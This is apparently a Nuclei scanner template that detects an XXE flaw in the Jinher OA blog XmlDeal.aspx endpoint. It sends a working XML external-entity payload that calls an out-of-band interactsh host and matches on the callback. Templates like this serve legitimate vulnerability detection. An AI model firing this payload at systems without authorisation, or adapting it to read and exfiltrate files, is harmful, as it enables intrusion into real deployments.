id: jinher-blog-xxe
info:
  name: 金和OA blog XmlDeal XXE
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog

variables:
  reverse: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.blog/XmlDeal.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
        %remote;]>
        <root/>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "SessionId="
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
